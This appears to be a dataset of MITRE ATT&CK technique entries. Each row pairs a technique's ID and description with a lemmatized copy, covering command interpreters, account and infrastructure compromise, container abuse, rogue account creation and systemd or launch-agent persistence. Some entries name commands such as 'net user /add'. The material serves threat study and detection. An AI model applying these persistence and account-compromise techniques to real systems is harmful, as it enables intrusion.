method discover cloud service adversary use information gain shape follow behavior target datum credential enumerate service evade identify defense disable modify tool disable cloud log
T1619,Cloud Storage Object Discovery,"Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage. Similar to File and Directory Discovery on a local host, after identifying available storage services (i.e. Cloud Infrastructure Discovery) adversaries may access the contents/objects stored in cloud infrastructure.Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS .",adversary enumerate object cloud storage infrastructure adversary use information automate discovery shape follow behavior include request specific object cloud storage similar file directory discovery local host identify available storage service cloud infrastructure discovery adversary access content object store cloud infrastructure cloud service provider offer api allow user enumerate object store cloud storage example include aws
T1059,Command and Scripting Interpreter,"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.There are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",adversary abuse command script interpreter execute command script binary interface language provide way interact computer system common feature different platform system come build command line interface scripting capability example macos linux distribution include flavor unix shell windows installation include windows command shell powershell cross platform interpreter python commonly associate client application javascript visual basic adversary abuse technology way means execute arbitrary command command script embed initial access payload deliver victim lure document secondary payload download exist adversary execute command interactive terminal shell utilize remote service order achieve remote execution
T1059.001,Command and Scripting Interpreter: PowerShell,"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.A number of PowerShell-based offensive testing tools are available, including Empire, PowerSploit, PoshC2, and PSAttack.PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",adversary abuse powershell command script execution powershell powerful interactive command line interface scripting environment include windows operate system adversary use powershell perform number action include discovery information execution code example include start process cmdlet run executable invoke command cmdlet run command locally remote computer administrator permission require use powershell connect remote download run executable internet execute disk memory touch disk number powershell base offensive testing tool available include empire powersploit psattack powershell command script execute directly invoke binary interface powershell underlie system management automation assembly dll expose framework windows common language interface cli
T1059.002,Command and Scripting Interpreter: AppleScript,"Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.Scripts can be run from the command-line via osascript /path/to/script or osascript -e ""script here"". Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding #!/usr/bin/osascript to the start of the script file.AppleScripts do not need to call osascript to execute. However, they may be executed from within mach-O binaries by using the macOS Native APIs NSAppleScript or OSAScript, both of which execute code independent of the /usr/bin/osascript command line utility.Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute Native APIs, which otherwise would require compilation and execution in a mach-O binary file format.",adversary abuse applescript execution applescript macos scripting language design control application part os inter application message call appleevents appleevent message send independently easily script applescript event locate open window send keystroke interact open application locally remotely script run command line osascript script osascript script aside command line script execute numerous way include mail rule alarm automator workflow applescript execute plain text shell script add bin osascript start script file applescript need osascript execute execute mach o binary macos native api nsapplescript osascript execute code independent bin osascript command line utility adversary abuse applescript execute behavior interact open ssh connection move remote machine present user fake dialog box event start application remotely start locally interact application run remotely macos yosemite high applescript ability execute native api require compilation execution mach o binary file format
T1059.003,Command and Scripting Interpreter: Windows Command Shell,"Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.Adversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",adversary abuse windows command shell execution windows command shell cmd primary command prompt windows system windows command prompt control aspect system permission level require different subset command command prompt invoke remotely remote services file ex provide shell list sequential command run normal scripting operation conditional loop common use batch file include long repetitive task need run set command multiple system adversary leverage cmd execute command payload common use include cmd execute single command abuse cmd interactively input output forward command control channel
T1059.004,Command and Scripting Interpreter: Unix Shell,"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.",adversary abuse unix shell command script execution unix shell primary command prompt linux macos system variation unix shell exist sh bash zsh etc depend specific os distribution unix shell control aspect system certain command require elevate privilege unix shell support script enable sequential execution command typical programming operation conditional loop common use shell script include long repetitive task need run set command multiple system adversary abuse unix shell execute command payload interactive shell access command control channel lateral movement ssh adversary leverage shell script deliver execute multiple command victim payload persistence
T1059.005,Command and Scripting Interpreter: Visual Basic,"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).",adversary abuse visual basic vb execution vb programming language create microsoft interoperability windows technology component object model native api windows api tag legacy plan future evolution vb integrate support framework cross platform core derivative language base vb create visual basic applications vba vbscript vba event drive programming language build microsoft office party application adversary use vb payload execute malicious command common malicious usage include automate execution behavior vbscript embed vba content spearphishing attachment payload involve mark web bypass enable execution
T1059.006,Command and Scripting Interpreter: Python,"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the python.exe interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",adversary abuse python command script execution python popular scripting programming language capability perform function python execute interactively command line interpreter script write distribute different system python code compile binary executable python come build package interact underlie system file operation device adversary use library download execute command script perform malicious behavior
T1059.007,Command and Scripting Interpreter: JavaScript,"Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application (HTA) pages.JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and AppleScript. Scripts can be executed via the command line utility osascript, they can be compiled into applications or script files via osacompile, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a Drive-by Compromise or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of Obfuscated Files or Information.",adversary abuse implementation javascript execution javascript js platform independent scripting language compile time runtime commonly associate script webpage js execute runtime environment outside browser jscript microsoft implementation scripting standard jscript interpret windows script engine integrate component windows component object model internet explorer html application hta page javascript automation jxa macos scripting language base javascript include apple open scripting architecture osa introduce osx apple osa provide scripting capability control application interface operate system bridge access rest apple internal api osx osa support language jxa applescript script execute command line utility osascript compile application script file osacompile compile execute memory program leverage osakit framework adversary abuse implementation javascript execute behavior common use include host malicious script website drive compromise download execute script file secondary payload payload text base common adversary obfuscate content obfuscated files information
T1059.008,Command and Scripting Interpreter: Network Device CLI,"Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or SSH.Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.",adversary abuse scripting build command line interpreter cli network device execute malicious command payload cli primary means user administrator interact device order view system information modify device operation perform diagnostic administrative function cli typically contain permission level require different command scripting interpreter automate task extend functionality command set include network os cli scripting interpreter accessible direct console connection remote mean telnet use network cli change network device behave operate cli manipulate traffic flow intercept manipulate datum modify startup configuration parameter load malicious system software disable security feature logging avoid detection
T1059.009,Command and Scripting Interpreter: Cloud API,"Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, PowerShell modules like Azure for PowerShell, or software developer kits (SDKs) available for languages such as Python. Cloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.With proper permissions (often via use of credentials such as Application Access Token and Web Session Cookie), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.",adversary abuse cloud api execute malicious command api available cloud environment provide functionality feature rich method programmatic access nearly aspect tenant api utilize method command line interpreter cli browser cloud shell powershell module like azure powershell software developer kit sdk available language python cloud api functionality allow administrative access major service tenant compute storage identity access management iam networking security policy proper permission use credential application access token web session cookie adversary abuse cloud api invoke function execute malicious action example cli powershell functionality access binary instal cloud host premise host access browser base cloud shell offer cloud platform aws azure gcp cloud shell package unified environment use cli scripting module host container cloud environment
T1092,Communication Through Removable Media,"Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by Replication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",adversary perform command control compromised host potentially disconnected network removable medium transfer command system system system need compromise likelihood internet connect system compromise second lateral movement replication removable media command file relay disconnect system internet connect system adversary direct access
T1586,Compromise Accounts,"Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. Establish Accounts), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.Adversaries may directly leverage compromised email accounts for Phishing for Information or Phishing.",adversary compromise account service targeting operation incorporate social engineering utilization online persona important create cultivate account establish accounts adversary compromise exist account utilize exist persona engender level trust potential victim relationship knowledge compromise persona variety method exist compromise account gather credential phishe information purchase credential party site brute force credential ex password reuse breach credential dump pay employee supplier business partner access credential prior compromise account adversary conduct reconnaissance inform decision account compromise operation persona exist single site multiple site ex facebook linkedin twitter google etc compromised account require additional development include fill modify profile information develop social network incorporate photo adversary directly leverage compromise email account phishing information phishing
T1586.001,Compromise Accounts: Social Media Accounts,"Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. Social Media Accounts), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising social media accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps). Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others. Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).",adversary compromise social medium account targeting operation incorporate social engineering utilization online persona important create cultivate social medium profile social media accounts adversary compromise exist social medium account utilize exist persona engender level trust potential victim relationship knowledge compromise persona variety method exist compromise social medium account gather credential phishe information purchase credential party site brute force credential ex password reuse breach credential dump prior compromise social medium account adversary conduct reconnaissance inform decision account compromise operation persona exist single site multiple site ex facebook linkedin twitter etc compromised social medium account require additional development include fill modify profile information develop social network incorporate photo adversary use compromise social medium profile create new hijack exist connection target interest connection direct include try connect compromised profile leverage phase adversary lifecycle initial access ex spearphishing service
T1586.002,Compromise Accounts: Email Accounts,"Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct Phishing for Information, Phishing, or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: Domains).A variety of methods exist for compromising email accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or Phishing emails may evade reputation-based email filtering rules.Adversaries can use a compromised email account to hijack existing email threads with targets of interest.",adversary compromise email account targeting adversary use compromise email account operation leverage conduct phishing information phishing large scale spam email campaign utilize exist persona compromise email account engender level trust potential victim relationship knowledge compromise persona compromised email account acquisition infrastructure ex variety method exist compromise email account gather credential phishing information purchase credential party site brute force credential ex password reuse breach credential dump pay employee supplier business partner access credential prior compromise email account adversary conduct reconnaissance inform decision account compromise operation adversary target compromise know email account domain malicious spam phishing email evade reputation base email filtering rule adversary use compromise email account hijack exist email thread target interest
T1586.003,Compromise Accounts: Cloud Accounts,"Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.A variety of methods exist for compromising cloud accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, conducting Password Spraying attacks, or attempting to Steal Application Access Tokens.",adversary compromise cloud account targeting adversary use compromise cloud account operation include leverage cloud storage service dropbox microsoft onedrive aws bucket exfiltration cloud storage upload tools cloud account acquisition infrastructure virtual private servers serverless infrastructure compromise cloud account allow adversary develop sophisticated capability manage server variety method exist compromise cloud account gather credential phishing information purchase credential party site conduct password spraying attack attempt steal application access token
T1554,Compromise Client Software Binary,"Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.Adversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.",adversary modify client software binary establish persistent access system client software enable user access service provide server common client software type ssh client ftp client email client web browser adversary modification client software binary carry malicious task application use example adversary copy source code client software add backdoor compile target replace legitimate application binary support file backdoore application routinely execute user adversary leverage persistent access host
T1584,Compromise Infrastructure,"Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle. Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.Use of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with Digital Certificates) to further blend in and support staged information gathering and/or Phishing campaigns.By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.",adversary compromise party infrastructure targeting infrastructure solution include physical cloud server domain party web dns service instead buy lease rent infrastructure adversary compromise infrastructure use phase adversary lifecycle additionally adversary compromise numerous machine form botnet leverage use compromise infrastructure allow adversary stage launch execute operation compromised infrastructure help adversary operation blend traffic see normal contact high reputation trusted site example adversary leverage compromised infrastructure potentially conjunction digital certificates blend support stage information gathering phishing campaign compromised infrastructure adversary difficult tie action prior targeting adversary compromise infrastructure adversary
T1584.001,Compromise Infrastructure: Domains,"Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.Adversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.",adversary hijack domain subdomain targeting domain registration hijacking act change registration domain permission original registrant subdomain hijacking occur organization dns entry point non existent deprovisioned resource case adversary control subdomain conduct operation benefit trust associate domain adversary compromise domain engage domain shadowing create malicious subdomain control keep exist dns record service disrupt malicious subdomain unnoticed long period time
T1584.002,Compromise Infrastructure: DNS Server,"Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.",adversary compromise party dns server targeting post compromise activity adversary utilize dns traffic task include command control ex application layer protocol instead set dns server adversary compromise party dns server support operation compromise dns server adversary alter dns record control allow redirection organization traffic facilitate collection credential access effort adversary
T1584.003,Compromise Infrastructure: Virtual Private Server,"Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",adversary compromise party virtual private servers vpss targeting exist variety cloud service provider sell virtual machine container service adversary compromise vpss purchase party entity compromise vps use infrastructure adversary difficult physically tie operation compromise vps use later stage adversary lifecycle command control allow adversary benefit ubiquity trust associate high reputation cloud service provider add compromise party
T1584.004,Compromise Infrastructure: Server,"Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a Server or Virtual Private Server, adversaries may compromise third-party servers in support of operations.Adversaries may also compromise web servers to support watering hole operations, as in Drive-by Compromise, or email servers to support Phishing operations.",adversary compromise party server targeting use server allow adversary stage launch execute operation post compromise activity adversary utilize server task include command control instead purchase server virtual private server adversary compromise party server support operation adversary compromise web server support watering hole operation drive compromise email server support phishing operation
T1584.005,Compromise Infrastructure: Botnet,"Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).",adversary compromise numerous party system form botnet targeting botnet network compromised system instruct perform coordinate task botnet disposal adversary perform follow activity large scale phishing distributed denial service ddos
T1584.006,Compromise Infrastructure: Web Services,"Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.",adversary compromise access party web service targeting variety popular website exist legitimate user register web base service github twitter dropbox google sendgrid etc adversary try ownership legitimate user access web service use web service infrastructure support cyber operation web service abuse later stage adversary lifecycle command control web service exfiltration web service phishing common service offer google twitter make easy adversary hide expected noise utilize web service particularly access steal legitimate user adversary difficult physically tie operation additionally leverage compromise web base email service allow adversary leverage trust associate legitimate domain
T1584.007,Compromise Infrastructure: Serverless,"Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. Once compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server.",adversary compromise serverless cloud infrastructure cloudflare workers aws lambda function targeting utilize serverless infrastructure adversary difficult attribute infrastructure operation compromise serverless runtime environment leverage respond directly infect machine proxy traffic adversary own command control server
T1609,Container Administration Command,"Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as docker exec to execute a command within a running container.",adversary abuse container administration service execute command container container administration service docker daemon kubernetes api server kubelet allow remote management container environment docker adversary specify entrypoint container deployment execute script command use command docker exec execute command run container
T1613,Container and Resource Discovery,"Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs. In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution.",adversary attempt discover container resource available container environment resource include image deployment pod node information status cluster resource view web application kubernetes dashboard query docker kubernetes api docker log leak information environment environment configuration service available cloud provider victim utilize discovery resource inform adversary step environment perform lateral movement method utilize execution
T1136,Create Account,"Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.",adversary create account maintain access victim system sufficient level access create account establish secondary credentialed access require persistent remote access tool deploy system account create local system domain cloud tenant cloud environment adversary create account access specific service reduce chance detection
T1136.001,Create Account: Local Account,"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the net user /add command can be used to create a local account. On macOS systems the dscl -create command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as username.Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",adversary create local account maintain access victim system local account configure organization use user remote support service administration single system service sufficient level access net user command create local account macos system dscl command create local account local account add network device common network device cli command username account establish secondary credentialed access require persistent remote access tool deploy system
T1136.002,Create Account: Domain Account,"Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the net user /add /domain command can be used to create a domain account.Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",adversary create domain account maintain access victim system domain account manage active directory domain services access permission configure system service domain domain account cover user administrator service account sufficient level access net user command create domain account account establish secondary credentialed access require persistent remote access tool deploy system
T1136.003,Create Account: Cloud Account,"Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.Once an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding Additional Cloud Credentials or assigning Additional Cloud Roles.",adversary create cloud account maintain access victim system sufficient level access account establish secondary credentialed access require persistent remote access tool deploy system adversary create account access specific cloud service reduce chance detection adversary create cloud account manipulate account ensure persistence allow access additional resource example add additional cloud credential assign additional cloud role
T1543,Create or Modify System Process,"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect. Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.",adversary create modify system level process repeatedly execute malicious payload persistence operate system boot start process perform background system function windows linux system process refer service adversary install new service daemon agent configure execute startup repeatable interval order establish persistence similarly adversary modify exist service daemon agent achieve effect service daemon agent create administrator privilege execute root system privilege adversary leverage functionality create modify system process order escalate privilege
T1543.001,Create or Modify System Process: Launch Agent,"Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in /System/Library/LaunchAgents, /Library/LaunchAgents, and ~/Library/LaunchAgents. Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.Launch Agents can also be executed using the Launchctl command.Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the RunAtLoad or KeepAlive keys set to true.",adversary create modify launch agent repeatedly execute malicious payload persistence user log user launchd process start load parameter launch demand user agent property list file find library launchagents launchagents launchagents launch agents instal perform update program launch user specify program login conduct developer task launch agents execute launchctl command adversary install new launch agent execute login place file appropriate folder runatload keepalive key set true
T1543.002,Create or Modify System Process: Systemd Service,"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible. Systemd utilizes unit configuration files with the .service file extension to encode information about a service's process. By default, system level unit files are stored in the /systemd/system directory of the root owned directories (/). User level unit files are stored in the /systemd/user directories of the user owned directories ($HOME). Service unit files use the following directives to execute system commands: ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a service is started manually by systemctl, or on system start if the service is set to automatically start. ExecReload directive covers when a service restarts. ExecStop, ExecStopPre, and ExecStopPost directives cover when a service is stopped.Adversaries may abuse systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files systemd uses upon reboot or starting a service. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.The .service file’s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions.",adversary create modify systemd service repeatedly execute malicious payload persistence systemd system service manager commonly manage background daemon process know service system resource systemd default initialization init system linux distribution replace legacy init system include sysvinit upstart remain backwards compatible systemd utilize unit configuration file file extension encode information service process default system level unit file store system directory root own directory user level unit file store user directory user own directory home service unit file use following directive execute system command execstart execstartpre execstartpost directive cover execution command service start manually systemctl system start service set automatically start execreload directive cover service restart execstop execstoppre execstoppost directive cover service stop adversary abuse systemd functionality establish persistent access victim system create modify service unit file systemd use reboot start service adversary place symbolic link directory enable systemd find payload regardless reside filesystem file user directive run service specific user result privilege escalation base specific user group permission
